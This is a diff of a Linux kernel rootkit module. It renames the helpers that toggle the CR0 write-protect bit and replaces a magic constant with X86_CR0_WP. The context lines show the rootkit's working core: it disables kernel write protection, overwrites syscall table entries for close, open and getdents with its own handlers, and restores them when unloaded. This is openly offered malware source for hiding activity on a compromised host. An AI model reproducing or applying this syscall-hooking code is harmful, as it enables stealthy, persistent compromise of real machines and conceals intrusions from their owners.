@@ -74,22 +74,22 @@ asmlinkage int (*original_close)(int fd);
 asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
 asmlinkage long (*original_open)(const char __user *pathname, int flags, mode_t mode);
 
-static void make_writeable(void) 
+static void disable_write_protection(void) 
 {
     unsigned long value;
     asm volatile("mov %%cr0,%0" : "=r" (value), "=m" (__force_order));
-    if (value & 0x00010000) {
-        value &= ~0x00010000;
+    if (value & X86_CR0_WP) {
+        value &= ~X86_CR0_WP;
         asm volatile("mov %0,%%cr0": : "r" (value), "m" (__force_order));
     }
 }
 
-static void make_non_writeable(void) 
+static void enable_write_protection(void) 
 {
     unsigned long value;
     asm volatile("mov %%cr0,%0" : "=r" (value), "=m" (__force_order));
-    if (!(value & 0x00010000)) {
-        value |= 0x00010000;
+    if (!(value & X86_CR0_WP)) {
+        value |= X86_CR0_WP;
         asm volatile("mov %0,%%cr0": : "r" (value), "m" (__force_order));
     }
 }
@@ -435,7 +435,7 @@ int rootkit_init(void)
     printk("Syscall table at %p\n", syscall_table);
     
     // Disable write protection on page
-    make_writeable();
+    disable_write_protection();
     // hijack close system call
     original_close = (asmlinkage int (*)(int)) syscall_table[__NR_close];
     syscall_table[__NR_close] = (void *) my_close;
@@ -448,7 +448,7 @@ int rootkit_init(void)
     original_getdents = (asmlinkage int (*)(unsigned int, struct linux_dirent *, unsigned int))
                         syscall_table[__NR_getdents];
     syscall_table[__NR_getdents] = (void *) my_getdents;
-    make_non_writeable();
+    enable_write_protection();
        
     out:
     return 0;
@@ -465,14 +465,14 @@ void rootkit_exit(void)
     }
 
     // Disable write protection on page
-    make_writeable();
+    disable_write_protection();
 
     syscall_table[__NR_close] = (void *) original_close;
     syscall_table[__NR_open] = (void *) original_open;
     syscall_table[__NR_getdents] = (void *) original_getdents;
     
     // Enable write protection on page
-    make_non_writeable();
+    enable_write_protection();
     
 out:
     show_module();
